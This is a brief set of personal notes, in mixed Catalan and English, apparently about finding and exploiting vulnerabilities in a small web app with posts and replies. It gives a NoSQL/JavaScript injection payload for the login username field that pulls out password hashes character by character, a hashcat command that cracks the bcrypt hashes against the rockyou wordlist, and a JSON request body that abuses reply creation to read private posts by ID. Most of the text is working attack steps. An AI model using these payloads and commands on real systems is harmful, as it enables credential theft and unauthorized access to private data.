# Idees
- User0 -> contrasenya debil, pots extreure el hash utilitzant la vuln0 i crackejarlo local
- Afegir un password lock
- Cerca de posts

# Vulns
## Vuln0
Login username field exfil: Can be used to extract the hashes of the DB
- payload: `Mototruco' && this.password[0] == '$' || this.username == 'a`
- a is the user that I know
- Mototruco is the one I am exfiltrating
- Natural order must be before the user you are trying to exfil
- hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt  --show

## Vuln1
Add replies to your newly created post -> this can also be used to get private posts if you know their id
```
{
    "content":"Ets tontissim amego",
    "parent":"6731f1222bd998c985ea07b0",
    "replies": ["673200d27fc1faf7f95f5701"]
}
```

## Vuln2
